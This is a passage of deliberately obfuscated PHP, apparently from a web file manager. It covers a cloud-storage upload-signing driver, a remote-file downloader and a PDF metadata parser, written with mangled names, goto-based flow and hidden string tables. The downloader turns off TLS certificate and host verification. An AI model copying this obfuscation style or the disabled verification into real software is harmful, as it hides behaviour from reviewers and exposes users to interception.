$eò‘é…½¨ó = (int) $GLOBALS[$c·Š—’äÃ…[7]][$c·Š—’äÃ…[77]]; return $this->uploadPolicy($cÇ©¡ÚäÂ, $dÎß·À¾²ï, $eò‘é…½¨ó); } private function uploadPolicy($A¶°¦ªØ°õ, $D¾«Çí‚Ğá = 3600, $DîÔéàÂÉ² = 0) { goto Fãç½‚ÕÃ¿; eùãå™Ü¦: $dõ©‚ÑâœÚ = base64_encode(hash_hmac($Eà³ôˆ„‹ó[1247], "\x50\x4f\x53\124\x26{$fÑì´‘ÒÔ‘}\x26{$fóÉ¶´—›—}\x26{$cİàØ¶¯Ëï}", md5("{$this->userpass}"), !0)); $aäŒš ä±Í = array($Eà³ôˆ„‹ó[1115] => $cİàØ¶¯Ëï, $Eà³ôˆ„‹ó[1281] => "\125\120\131\x55\116\x20{$this->username}\72{$dõ©‚ÑâœÚ}", $Eà³ôˆ„‹ó[169] => $this->endpoint . $fÑì´‘ÒÔ‘); return $aäŒš ä±Í; goto C§êÍ±â²‰; Fãç½‚ÕÃ¿: $Eà³ôˆ„‹ó =& $_SERVER[¦·]; $fÑì´‘ÒÔ‘ = $Eà³ôˆ„‹ó[8] . $this->bucket; $fóÉ¶´—›— = gmdate($Eà³ôˆ„‹ó[1209]); goto d…÷„÷¤©; d…÷„÷¤©: $a”¼‡¹¾²Ñ = array($Eà³ôˆ„‹ó[1277] => $this->bucket, $Eà³ôˆ„‹ó[1278] => $A¶°¦ªØ°õ, $Eà³ôˆ„‹ó[1279] => time() + $D¾«Çí‚Ğá, $Eà³ôˆ„‹ó[1280] => $fóÉ¶´—›—); if ($DîÔéàÂÉ²) { $a”¼‡¹¾²Ñ[$Eà³ôˆ„‹ó[1195]] = $DîÔéàÂÉ²; } $cİàØ¶¯Ëï = base64_encode(json_encode($a”¼‡¹¾²Ñ)); goto eùãå™Ü¦; C§êÍ±â²‰: } public function download($AŠĞĞ™Å…®, $EŠêÛÄ¢—“) { goto F®õèˆá¨; f‡¶ƒÛ„‰å: $FÑŒŞÉÎ ¼ = 1024 * 200; $Bæé©¹ªÇ“ = fopen($E¹÷™ªºßò, $_SERVER[¦·][1230]); while (!0) { $B¯±¨¶‹ƒ = $this->fileSubstr($AŠĞĞ™Å…®, $D¸£´‹šìâ, $FÑŒŞÉÎ ¼); if ($B¯±¨¶‹ƒ === !1) { return !1; } fwrite($Bæé©¹ªÇ“, $B¯±¨¶‹ƒ); $D¸£´‹šìâ += $FÑŒŞÉÎ ¼; if (strlen($B¯±¨¶‹ƒ) < $FÑŒŞÉÎ ¼) { break; } } goto CíÏôØ®æ; CíÏôØ®æ: fclose($Bæé©¹ªÇ“); return $EŠêÛÄ¢—“; goto a¯´­†ËÄ—; F®õèˆá¨: $E¹÷™ªºßò = IO::getPathInner(IO::mkfile($EŠêÛÄ¢—“)); if (!($eó†ôÜØ = $this->link($AŠĞĞ™Å…®))) { return !1; } $D¸£´‹šìâ = 0; goto f‡¶ƒÛ„‰å; a¯´­†ËÄ—: } public function link($DŸà¿äàÌ›, $fÒÁ‹Ã¯«ì = array()) { $bœçÛƒÏÖ =& $_SERVER[¦·]; $DŸà¿äàÌ› = trim($DŸà¿äàÌ›, $bœçÛƒÏÖ[8]); if (!empty($this->token)) { $E›ñ¯Í‹§ê = strtotime(date($bœçÛƒÏÖ[1282])); $f­ÆíÉ¨ÍÈ = substr(md5($this->token . $bœçÛƒÏÖ[272] . $E›ñ¯Í‹§ê . $bœçÛƒÏÖ[1283] . $DŸà¿äàÌ›), 12, 8) . $E›ñ¯Í‹§ê; $fÒÁ‹Ã¯«ì[] = $bœçÛƒÏÖ[1284] . $f­ÆíÉ¨ÍÈ; } $a‡ØÌ”§²Ö = !empty($fÒÁ‹Ã¯«ì) ? $bœçÛƒÏÖ[69] . implode($bœçÛƒÏÖ[272], $fÒÁ‹Ã¯«ì) : $bœçÛƒÏÖ[33]; return $this->getHost() . $bœçÛƒÏÖ[8] . $DŸà¿äàÌ› . $a‡ØÌ”§²Ö; } public function fileOut($dóÍæÏ¹·Ú, $D‹ÒğÅìé = false, $e†™ÜĞÛŸ = false, $aÈè£Ü³¼ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($dóÍæÏ¹·Ú, $D‹ÒğÅìé, $e†™ÜĞÛŸ, $aÈè£Ü³¼); } if (!$e†™ÜĞÛŸ) { $e†™ÜĞÛŸ = $this->pathThis($dóÍæÏ¹·Ú); } $e¹°ø†Ëô = $D‹ÒğÅìé ? array($_SERVER[¦·][1285] . rawurlencode($e†™ÜĞÛŸ)) : array(); $f´ŒÂÅ µ = $this->link($dóÍæÏ¹·Ú, $e¹°ø†Ëô); $this->fileOutLink($f´ŒÂÅ µ); } public function fileOutServer($Dâ¬ª¶¸À, $f¶ìÔñ£Ñ… = false, $aŞŠã¹¶¶ = false, $f¹•»ñÕŠ‘ = '') { parent::fileOut($Dâ¬ª¶¸À, $f¶ìÔñ£Ñ…, $aŞŠã¹¶¶, $f¹•»ñÕŠ‘); } public function fileOutImage($F¹¬Ç”ÍË¥, $F¥ß½‘Á¸ = 250) { $Bé¬ÍÉñ© = $this->link($F¹¬Ç”ÍË¥ . $_SERVER[¦·][1286] . $F¥ß½‘Á¸); $this->fileOutLink($Bé¬ÍÉñ©); } public function fileOutImageServer($a•«ö‡Ñö‘, $fµğ¹à«„· = 250) { parent::fileOutImage($a•«ö‡Ñö‘, $fµğ¹à«„·); } public function hashMd5($c†“‘òªë) { $AÓ­İ‡¶éÆ =& $_SERVER[¦·]; $b‹éƒƒ²Ñ¦ = $this->objectMeta($c†“‘òªë); return isset($b‹éƒƒ²Ñ¦[$AÓ­İ‡¶éÆ[196]]) ? $b‹éƒƒ²Ñ¦[$AÓ­İ‡¶éÆ[196]] : !1; } public function size($FŸĞ¶«´‚¿) { $eãà‹œˆ»Õ = $this->objectMeta($FŸĞ¶«´‚¿); return $eãà‹œˆ»Õ ? $eãà‹œˆ»Õ[$_SERVER[¦·][77]] : 0; } public function info($AîÑÑí“¸…) { if ($this->isFolder($AîÑÑí“¸…)) { return $this->folderInfo($AîÑÑí“¸…); } else { if ($this->isFile($AîÑÑí“¸…)) { return $this->fileInfo($AîÑÑí“¸…); } } return !1; } public function exist($aÍÙ®Ø¬Ì) { return $this->isFile($aÍÙ®Ø¬Ì) || $this->isFolder($aÍÙ®Ø¬Ì); } public function isFile($aôŸ§•Ï¬) { return !$this->isFolder($aôŸ§•Ï¬) && $this->objectMeta($aôŸ§•Ï¬); } public function isFolder($d¦Ú…ØãÌ) { return $this->cacheMethod($_SERVER[¦·][223], $d¦Ú…ØãÌ); } protected function objectMeta($AëÍ¢ï“Íˆ) { return $this->cacheMethod($_SERVER[¦·][224], $AëÍ¢ï“Íˆ); } protected function _objectMeta($A§™°¶Ÿ«) { goto AÅÖçá÷ˆÌ; bòéÊ²: if (!$dˆµ†ïŸÂ”[$aÎ§ˆàĞÁ®[1035]]) { return null; } $d˜Ç¥¡Š¢ë = isset($dˆµ†ïŸÂ”[$aÎ§ˆàĞÁ®[1037]]) ? $dˆµ†ïŸÂ”[$aÎ§ˆàĞÁ®[1037]] : array(); if (!isset($d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1288]])) { return null; } goto b‰âİ†ë£¼; AÅÖçá÷ˆÌ: $aÎ§ˆàĞÁ® =& $_SERVER[¦·]; if ($A§™°¶Ÿ« == $aÎ§ˆàĞÁ®[33] || $A§™°¶Ÿ« == $aÎ§ˆàĞÁ®[8]) { return array(); } $dˆµ†ïŸÂ” = $this->ussRequest($A§™°¶Ÿ«, $aÎ§ˆàĞÁ®[1287]); goto bòéÊ²; b‰âİ†ë£¼: $b×Óø±°‹© = array($aÎ§ˆàĞÁ®[28] => get_path_this($A§™°¶Ÿ«), $aÎ§ˆàĞÁ®[29] => isset($d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1288]]) ? $d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1288]] : null, $aÎ§ˆàĞÁ®[77] => isset($d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1289]]) ? $d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1289]] : null, $aÎ§ˆàĞÁ®[196] => isset($d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1290]]) ? $d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1290]] : null, $aÎ§ˆàĞÁ®[1258] => isset($d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1291]]) ? $d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1291]] : null); $b×Óø±°‹©[$aÎ§ˆàĞÁ®[1259]] = isset($d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1292]]) ? strtotime($d˜Ç¥¡Š¢ë[$aÎ§ˆàĞÁ®[1292]]) : $b×Óø±°‹©[$aÎ§ˆàĞÁ®[1258]]; return $b×Óø±°‹©; goto fÚšÀÇêé; fÚšÀÇêé: } protected function _isFolder($Bİ¶Š‹è“ƒ) { $C—ÎÖÎ½â =& $_SERVER[¦·]; if ($Bİ¶Š‹è“ƒ == $C—ÎÖÎ½â[33] || $Bİ¶Š‹è“ƒ == $C—ÎÖÎ½â[8]) { return !0; } $cµ­ôŒÊ¾ = $this->objectMeta($Bİ¶Š‹è“ƒ); return isset($cµ­ôŒÊ¾[$C—ÎÖÎ½â[29]]) && $cµ­ôŒÊ¾[$C—ÎÖÎ½â[29]] == $C—ÎÖÎ½â[76] ? !0 : !1; } } goto bô·Ê²àõ; DîÛ¿ëÌ“¾: class Downloader { static function start($Cµ²äÑ¾´, $cÁ•Ä‰™à”, $A¢Œ‰«í¢ = 10) { goto CÊÅÅ©ò; CÊÅÅ©ò: $B¸³éİ›µÍ =& $_SERVER[¦·]; if (!request_url_safe($Cµ²äÑ¾´)) { return array($B¸³éİ›µÍ[1035] => !1, $B¸³éİ›µÍ[1037] => $B¸³éİ›µÍ[1040]); } $cƒ‹´‹ÌØ± = $cÁ•Ä‰™à” . $B¸³éİ›µÍ[1519]; goto A²‡ËƒŞ‰Ñ; Eƒã¿èÜê‘: if (!$Cµ²äÑ¾´) { return array($B¸³éİ›µÍ[1035] => !1, $B¸³éİ›µÍ[1037] => $B¸³éİ›µÍ[1040]); } if (!$dÊîÒœîá§[$B¸³éİ›µÍ[1293]] || $dÊîÒœîá§[$B¸³éİ›µÍ[325]] == 0) { @unlink($c¬Ì¤Áù‰ ); @unlink($cÁ•Ä‰™à”); $d–ùÊŒè½ = self::fileDownloadFopen($Cµ²äÑ¾´, $cÁ•Ä‰™à”, $dÊîÒœîá§[$B¸³éİ›µÍ[325]]); if ($d–ùÊŒè½[$B¸³éİ›µÍ[1035]]) { return $d–ùÊŒè½; } else { @unlink($c¬Ì¤Áù‰ ); @unlink($cÁ•Ä‰™à”); $d–ùÊŒè½ = self::fileDownloadCurl($Cµ²äÑ¾´, $cÁ•Ä‰™à”, !1, 0, $dÊîÒœîá§[$B¸³éİ›µÍ[325]]); @unlink($c¬Ì¤Áù‰ ); return $d–ùÊŒè½; } } $eÑ¨Û½§Å‘ = is_file($c¬Ì¤Áù‰ ) ? filesize_64($c¬Ì¤Áù‰ ) : 0; goto e°‹•¤ìñŞ; e°‹•¤ìñŞ: $EØ¢¸º’ê = intval($dÊîÒœîá§[$B¸³éİ›µÍ[325]]); if (file_exists($c¬Ì¤Áù‰ ) && time() - filemtime($c¬Ì¤Áù‰ ) < 3) { return array($B¸³éİ›µÍ[1035] => !1, $B¸³éİ›µÍ[1037] => $B¸³éİ›µÍ[1521]); } $bö¡¸à–¼ñ = array(); goto aÑ¡µßöˆÇ; Eö„óó’í: if ($eÑ¨Û½§Å‘ > $EØ¢¸º’ê) { @unlink($c¬Ì¤Áù‰ ); } file_put_contents($cƒ‹´‹ÌØ±, json_encode($bö¡¸à–¼ñ)); $d–ùÊŒè½ = self::fileDownloadCurl($Cµ²äÑ¾´, $cÁ•Ä‰™à”, !0, $eÑ¨Û½§Å‘, $EØ¢¸º’ê); goto B¿›ßŞá‹Í; B¿›ßŞá‹Í: if ($d–ùÊŒè½[$B¸³éİ›µÍ[1035]]) { @unlink($cƒ‹´‹ÌØ±); } return $d–ùÊŒè½; goto a¾”Öƒ­; aÑ¡µßöˆÇ: if (is_file($cƒ‹´‹ÌØ±)) { $fôÆ‰‹˜ † = file_get_contents($cƒ‹´‹ÌØ±); $bö¡¸à–¼ñ = json_decode($fôÆ‰‹˜ †, 1); } if (file_exists($cÁ•Ä‰™à”) && $EØ¢¸º’ê == filesize_64($cÁ•Ä‰™à”)) { @unlink($c¬Ì¤Áù‰ ); @unlink($cƒ‹´‹ÌØ±); return array($B¸³éİ›µÍ[1035] => !0, $B¸³éİ›µÍ[1037] => $B¸³éİ›µÍ[1522]); } if ($bö¡¸à–¼ñ[$B¸³éİ›µÍ[325]] != $EØ¢¸º’ê) { $bö¡¸à–¼ñ = array($B¸³éİ›µÍ[325] => $EØ¢¸º’ê); } goto Eö„óó’í; A²‡ËƒŞ‰Ñ: $c¬Ì¤Áù‰  = $cÁ•Ä‰™à” . $B¸³éİ›µÍ[1520]; if (is_array($Cµ²äÑ¾´)) { $dÊîÒœîá§ = $Cµ²äÑ¾´; } else { $dÊîÒœîá§ = url_header($Cµ²äÑ¾´); } $Cµ²äÑ¾´ = $dÊîÒœîá§[$B¸³éİ›µÍ[295]]; goto Eƒã¿èÜê‘; a¾”Öƒ­: } static function fileDownloadFopen($dĞÏ‡Šóğë, $b±ŞÄ„ÖÎ, $E×Œ²ã¸ = 0) { $CÁ¼²†ŸÈ =& $_SERVER[¦·]; @ini_set($CÁ¼²†ŸÈ[1523], $CÁ¼²†ŸÈ[1524]); $EÈĞëÄ¦Şƒ = $b±ŞÄ„ÖÎ . $CÁ¼²†ŸÈ[1520]; set_timeout(); @unlink($EÈĞëÄ¦Şƒ); if ($f¡’ˆ·¾ìÅ = @fopen($dĞÏ‡Šóğë, $CÁ¼²†ŸÈ[1525])) { goto B—²Ÿë©¡İ; B—²Ÿë©¡İ: if (!($a¤”Ú¬‡ŸÉ = @fopen($EÈĞëÄ¦Şƒ, $CÁ¼²†ŸÈ[1526]))) { return array($CÁ¼²†ŸÈ[1035] => !1, $CÁ¼²†ŸÈ[1037] => $CÁ¼²†ŸÈ[1527]); } while (!feof($f¡’ˆ·¾ìÅ)) { if (!file_exists($EÈĞëÄ¦Şƒ)) { fclose($a¤”Ú¬‡ŸÉ); return array($CÁ¼²†ŸÈ[1035] => !1, $CÁ¼²†ŸÈ[1037] => $CÁ¼²†ŸÈ[1528]); } clearstatcache(); if ($E×Œ²ã¸ > 0 && $E×Œ²ã¸ == filesize(iconv_system($EÈĞëÄ¦Şƒ))) { break; } fwrite($a¤”Ú¬‡ŸÉ, fread($f¡’ˆ·¾ìÅ, 1024 * 8), 1024 * 8); } fclose($a¤”Ú¬‡ŸÉ); goto Fè·Òø–²ß; b”™§Şë§¾: return array($CÁ¼²†ŸÈ[1035] => !0, $CÁ¼²†ŸÈ[1037] => $CÁ¼²†ŸÈ[697]); goto bÍØÌ®î‰Ú; Fè·Òø–²ß: fclose($f¡’ˆ·¾ìÅ); self::checkGzip($EÈĞëÄ¦Şƒ); if (!@rename($EÈĞëÄ¦Şƒ, $b±ŞÄ„ÖÎ)) { usleep(round(rand(0, 1000) * 50)); @unlink($b±ŞÄ„ÖÎ); $aœ¾¸°Ÿ = @rename($EÈĞëÄ¦Şƒ, $b±ŞÄ„ÖÎ); if (!$aœ¾¸°Ÿ) { return array($CÁ¼²†ŸÈ[1035] => !1, $CÁ¼²†ŸÈ[1037] => $CÁ¼²†ŸÈ[1529]); } } goto b”™§Şë§¾; bÍØÌ®î‰Ú: } else { return array($CÁ¼²†ŸÈ[1035] => !1, $CÁ¼²†ŸÈ[1037] => $CÁ¼²†ŸÈ[1530]); } } static function fileDownloadCurl($e†¡®ªåá°, $B‰ñŸùŠƒ„, $aİ¾Ó¤ÎÉë = false, $e³ÊîÍÄ¶ = 0, $f×¡‚«½¶ = 0) { goto E‘ëÁÔ‘›; A¶ÆŞ‰ÌŒê: curl_close($Fç‚î—îÈ); fclose($Eº„ææŞô); $BÄøª¤–‘ = filesize_64(iconv_system($fÉ¡‹¡†à)); goto C¨•Ï¡¦×Ğ; aÅ¡ãµ†Û: curl_setopt($Fç‚î—îÈ, CURLOPT_USERAGENT, $Dåòõ’‡Äù[1524]); $d¾õÕÉÆ = curl_exec($Fç‚î—îÈ); curl_progress_end($Fç‚î—îÈ); goto A¶ÆŞ‰ÌŒê; DŞ°ÚÕ·´ó: if ($aİ¾Ó¤ÎÉë) { curl_setopt($Fç‚î—îÈ, CURLOPT_RANGE, $e³ÊîÍÄ¶ . $Dåòõ’‡Äù[716]); } curl_setopt($Fç‚î—îÈ, CURLOPT_FILE, $Eº„ææŞô); curl_setopt($Fç‚î—îÈ, CURLOPT_REFERER, get_url_link($e†¡®ªåá°)); goto cˆÈ½«¨˜•; f›ÓæÑÑ°: curl_setopt($Fç‚î—îÈ, CURLOPT_NOPROGRESS, !1); curl_setopt($Fç‚î—îÈ, CURLOPT_PROGRESSFUNCTION, $Dåòõ’‡Äù[1532]); curl_progress_start($Fç‚î—îÈ); goto aÅ¡ãµ†Û; C¨•Ï¡¦×Ğ: if ($BÄøª¤–‘ < $f×¡‚«½¶ && $f×¡‚«½¶ != 0) { return array($Dåòõ’‡Äù[1035] => !1, $Dåòõ’‡Äù[1037] => $Dåòõ’‡Äù[1521]); } if ($d¾õÕÉÆ && filesize_64($fÉ¡‹¡†à) != 0) { self::checkGzip($fÉ¡‹¡†à); if (!@rename($fÉ¡‹¡†à, $B‰ñŸùŠƒ„)) { @unlink($B‰ñŸùŠƒ„); $d¾õÕÉÆ = @rename($fÉ¡‹¡†à, $B‰ñŸùŠƒ„); if (!$d¾õÕÉÆ) { return array($Dåòõ’‡Äù[1035] => !1, $Dåòõ’‡Äù[1037] => $Dåòõ’‡Äù[1533]); } } return array($Dåòõ’‡Äù[1035] => !0, $Dåòõ’‡Äù[1037] => $Dåòõ’‡Äù[697]); } return array($Dåòõ’‡Äù[1035] => !1, $Dåòõ’‡Äù[1037] => $Dåòõ’‡Äù[1534]); goto Fß„ìï™°¾; cˆÈ½«¨˜•: curl_setopt($Fç‚î—îÈ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Fç‚î—îÈ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Fç‚î—îÈ, CURLOPT_SSL_VERIFYHOST, 0); goto f›ÓæÑÑ°; F³·”ááÒù: $Eº„ææŞô = @fopen($fÉ¡‹¡†à, $Dåòõ’‡Äù[983]); if (!$Eº„ææŞô) { return array($Dåòõ’‡Äù[1035] => !1, $Dåòõ’‡Äù[1037] => $Dåòõ’‡Äù[1531]); } $Fç‚î—îÈ = curl_init($e†¡®ªåá°); goto DŞ°ÚÕ·´ó; E‘ëÁÔ‘›: $Dåòõ’‡Äù =& $_SERVER[¦·]; $fÉ¡‹¡†à = $B‰ñŸùŠƒ„ . $Dåòõ’‡Äù[1520]; set_timeout(); goto F³·”ááÒù; Fß„ìï™°¾: } static function checkGzip($d¶¥–Ç•˜) { goto aŠ‡¾¯§; eˆÊ†…•…õ: file_put_contents($d¶¥–Ç•˜, $f‰êœŞÄÅÈ); goto b‚¾®ğÛ¹¥; aŠ‡¾¯§: $E±µ…­¢Ş = $_SERVER[¦·][1535]; $eç”ËÁÂğ = file_sub_str($d¶¥–Ç•˜, 0, 2); if ($E±µ…­¢Ş != $eç”ËÁÂğ) { return; } goto dˆÆâ¾Ø; dˆÆâ¾Ø: ob_start(); readgzfile($d¶¥–Ç•˜); $f‰êœŞÄÅÈ = ob_get_clean(); goto eˆÊ†…•…õ; b‚¾®ğÛ¹¥: } } class FileParsePdf { public static function parse($BË›Õ¢ß½¬) { goto dÇË»íñ…¼; aÉÔ´ÊÛ³Ò: if ($Bùø¢­àµÛ) { $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1346]] = $Bùø¢­àµÛ[1]; } $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1544]] = 0; $fÌ·Í“«„ = $CÂ¯íß‹Û¢[1545]; goto cÚ…Ûà……Í; dÇË»íñ…¼: $CÂ¯íß‹Û¢ =& $_SERVER[¦·]; $c›Åõ–¡‡ö = 32 * 1024; $A‘Ù¢Á³¹„ = array($CÂ¯íß‹Û¢[777] => fopen($BË›Õ¢ß½¬, $CÂ¯íß‹Û¢[1174]), $CÂ¯íß‹Û¢[75] => $BË›Õ¢ß½¬, $CÂ¯íß‹Û¢[77] => filesize_64($BË›Õ¢ß½¬), $CÂ¯íß‹Û¢[1536] => $c›Åõ–¡‡ö); goto DçÀìÓµ’; F‰İÚˆÏ´É: if ($aŸŠŒôî‰“) { $Fó†–ä˜Äİ = $aŸŠŒôî‰“[$CÂ¯íß‹Û¢[1539]][$CÂ¯íß‹Û¢[1196]]; $e…¹õ¡Œ…„ = self::getObjectValue($A‘Ù¢Á³¹„, $aŸŠŒôî‰“, $Fó†–ä˜Äİ); } $e…¹õ¡Œ…„ = is_array($e…¹õ¡Œ…„) ? $e…¹õ¡Œ…„ : array(); $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1540]] = 0; goto aÂÜÕÙÙÕ ; cÚ…Ûà……Í: preg_match_all($fÌ·Í“«„, $A‘Ù¢Á³¹„[$CÂ¯íß‹Û¢[1537]], $Bùø¢­àµÛ); if ($Bùø¢­àµÛ[1] && $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1544]] < $Bùø¢­àµÛ[1][0]) { $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1544]] = $Bùø¢­àµÛ[1][0]; } preg_match_all($fÌ·Í“«„, $A‘Ù¢Á³¹„[$CÂ¯íß‹Û¢[1538]], $Bùø¢­àµÛ); goto C«¼Ò„Ã‚; aÂÜÕÙÙÕ : $fÌ·Í“«„ = $CÂ¯íß‹Û¢[1541]; preg_match($fÌ·Í“«„, $A‘Ù¢Á³¹„[$CÂ¯íß‹Û¢[1537]], $Bùø¢­àµÛ); if (!$e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1540]] && count($Bùø¢­àµÛ) == 5) { $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1540]] = $Bùø¢­àµÛ[3]; $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1542]] = $Bùø¢­àµÛ[4]; } goto E”ÊÛ®³·Ğ; C«¼Ò„Ã‚: if ($Bùø¢­àµÛ[1] && $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1544]] < $Bùø¢­àµÛ[1][0]) { $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1544]] = $Bùø¢­àµÛ[1][0]; } $e…¹õ¡Œ…„ = self::parseInfoItem($e…¹õ¡Œ…„); return $e…¹õ¡Œ…„; goto CòåÀø¯—; E”ÊÛ®³·Ğ: preg_match($fÌ·Í“«„, $A‘Ù¢Á³¹„[$CÂ¯íß‹Û¢[1538]], $Bùø¢­àµÛ); if (!$e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1540]] && count($Bùø¢­àµÛ) == 5) { $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1540]] = $Bùø¢­àµÛ[3]; $e…¹õ¡Œ…„[$CÂ¯íß‹Û¢[1542]] = $Bùø¢­àµÛ[4]; } preg_match($CÂ¯íß‹Û¢[1543], $A‘Ù¢Á³¹„[$CÂ¯íß‹Û¢[1537]], $Bùø¢­àµÛ); goto aÉÔ´ÊÛ³Ò; DçÀìÓµ’: $A‘Ù¢Á³¹„[$CÂ¯íß‹Û¢[1537]] = StreamWrapperIO::read($BË›Õ¢ß½¬, 0, $c›Åõ–¡‡ö); $A‘Ù¢Á³¹„[$CÂ¯íß‹Û¢[1538]] = StreamWrapperIO::read($BË›Õ¢ß½¬, $A‘Ù¢Á³¹„[$CÂ¯íß‹Û¢[77]] - $c›Åõ–¡‡ö, $c›Åõ–¡‡ö); $aŸŠŒôî‰“ = self::decodeXref($A‘Ù¢Á³¹„); goto F‰İÚˆÏ´É; CòåÀø¯—: } private static function parseInfoItem($AÆ°ÄèÎê) { $b†âŠæÚ˜â =& $_SERVER[¦·]; if (!$AÆ°ÄèÎê) { return !1; } $dƒä£‚¹‘Ò = array($b†âŠæÚ˜â[1347] => array($b†âŠæÚ˜â[1546], $b†âŠæÚ˜â[33]), $b†âŠæÚ˜â[1547] => array($b†âŠæÚ˜â[1548], $b†âŠæÚ˜â[33]), $b†âŠæÚ˜â[187] => array($b†âŠæÚ˜â[1549], $b†âŠæÚ˜â[210]), $b†âŠæÚ˜â[107] => array($b†âŠæÚ˜â[1550], $b†âŠæÚ˜â[210]), $b†âŠæÚ˜â[1544] => array($b†âŠæÚ˜â[1544], $b†âŠæÚ˜â[276]), $b†âŠæÚ˜â[1540] => array($b†âŠæÚ˜â[1540], $b†âŠæÚ˜â[276]), $b†âŠæÚ˜â[1542] => array($b†âŠæÚ˜â[1542], $b†âŠæÚ˜â[276]), $b†âŠæÚ˜â[1551] => array($b†âŠæÚ˜â[1552], $b†âŠæÚ˜â[33]), $b†âŠæÚ˜â[1553] => array($b†âŠæÚ˜â[1554], $b†âŠæÚ˜â[33]), $b†âŠæÚ˜â[1555] => array($b†âŠæÚ˜â[1346], $b†âŠæÚ˜â[33])); $c‹ïÀ…›éù = array(); foreach ($dƒä£‚¹‘Ò as $a…ºÔš¦çŠ => $eæî¤¦ŞÆ¦) { if (!isset($AÆ°ÄèÎê[$eæî¤¦ŞÆ¦[0]])) { continue; } $BêÆù‚í¦ = $AÆ°ÄèÎê[$eæî¤¦ŞÆ¦[0]]; if (!$BêÆù‚í¦ || is_array($BêÆù‚í¦)) { continue; } switch ($eæî¤¦ŞÆ¦[1]) { case $b†âŠæÚ˜â[276]: $BêÆù‚í¦ = intval($BêÆù‚í¦); break; case $b†âŠæÚ˜â[210]: if (substr($BêÆù‚í¦, 0, 2) == $b†âŠæÚ˜â[1556]) { $BêÆù‚í¦ = substr($BêÆù‚í¦, 2, 14); } if (strtotime($BêÆù‚í¦)) { $BêÆù‚í¦ = date($b†âŠæÚ˜â[1557], strtotime($BêÆù‚í¦)); } break; } $c‹ïÀ…›éù[$a…ºÔš¦çŠ] = $BêÆù‚í¦; } return $c‹ïÀ…›éù; } private static function decodeXref(&$fø¸°ğ‡œå) { goto f‡È‡â˜§; CóáÖŒÇ¨®: if ($fø¸°ğ‡œå[$D¶èÔÊôğÛ[77]] - $FÖ­’œÏá¡ > $fø¸°ğ‡œå[$D¶èÔÊôğÛ[1536]]) { $fƒÇ‘¦«Ç = 4 * $fø¸°ğ‡œå[$D¶èÔÊôğÛ[1536]]; $fø¸°ğ‡œå[$D¶èÔÊôğÛ[1536]] = $fƒÇ‘¦«Ç; $fø¸°ğ‡œå[$D¶èÔÊôğÛ[1537]] = StreamWrapperIO::read($fø¸°ğ‡œå[$D¶èÔÊôğÛ[75]], 0, $fƒÇ‘¦«Ç); $fø¸°ğ‡œå[$D¶èÔÊôğÛ[1538]] = StreamWrapperIO::read($fø¸°ğ‡œå[$D¶èÔÊôğÛ[75]], $fø¸°ğ‡œå[$D¶èÔÊôğÛ[77]] - $fƒÇ‘¦«Ç, $fƒÇ‘¦«Ç); $B«ïä˜ÛŞ = $fø¸°ğ‡œå[$D¶èÔÊôğÛ[1538]]; } $CÅë¤¾ÃÙ‡ = 0; preg_match_all($D¶èÔÊôğÛ[1560], $B«ïä˜ÛŞ, $f¯‹ä Ğ½); goto A–çİ¸Ü”©; F×åì¼Ã–: $B‡¶†ÙğÕÛ = $D¶èÔÊôğÛ[1559]; if (!preg_match_all($B‡¶†ÙğÕÛ, $B«ïä˜ÛŞ, $f¯‹ä Ğ½, PREG_SET_ORDER, 0)) { return !1; } $FÖ­’œÏá¡ = intval($f¯‹ä Ğ½[0][1]); goto CóáÖŒÇ¨®; f…‰äâöäœ: if (preg_match($D¶èÔÊôğÛ[1570], $a“ØÅ½¨Ì, $f¯‹ä Ğ½) > 0) { $dÕ–£¡”©[$D¶èÔÊôğÛ[1539]][$D¶èÔÊôğÛ[1196]] = intval($f¯‹ä Ğ½[1]) . $D¶èÔÊôğÛ[70] . intval($f¯‹ä Ğ½[2]); } if (preg_match($D¶èÔÊôğÛ[1571], $a“ØÅ½¨Ì, $f¯‹ä Ğ½) > 0) { $dÕ–£¡”©[$D¶èÔÊôğÛ[1539]][$D¶èÔÊôğÛ[367]] = array(); $dÕ–£¡”©[$D¶èÔÊôğÛ[1539]][$D¶èÔÊôğÛ[367]][0] = $f¯‹ä Ğ½[1]; $dÕ–£¡”©[$D¶èÔÊôğÛ[1539]][$D¶èÔÊôğÛ[367]][1] = $f¯‹ä Ğ½[2]; } if (!$dÕ–£¡”©[$D¶èÔÊôğÛ[1539]][$D¶èÔÊôğÛ[1196]]) { return !1; } goto CÙçŞÄã•; BÛ¶£ôô‰: if (preg_match($D¶èÔÊôğÛ[1565], $a“ØÅ½¨Ì, $f¯‹ä Ğ½) > 0) { $dÕ–£¡”©[$D¶èÔÊôğÛ[1539]][$D¶èÔÊôğÛ[77]] = intval($f¯‹ä Ğ½[1]); } if (preg_match($D¶èÔÊôğÛ[1566], $a“ØÅ½¨Ì, $f¯‹ä Ğ½) > 0) { $dÕ–£¡”©[$D¶èÔÊôğÛ[1539]][$D¶èÔÊôğÛ[1567]] = intval($f¯‹ä Ğ½[1]) . $D¶èÔÊôğÛ[70] . intval($f¯‹ä Ğ½[2]); } if (preg_match($D¶èÔÊôğÛ[1568], $a“ØÅ½¨Ì, $f¯‹ä Ğ½) > 0) { 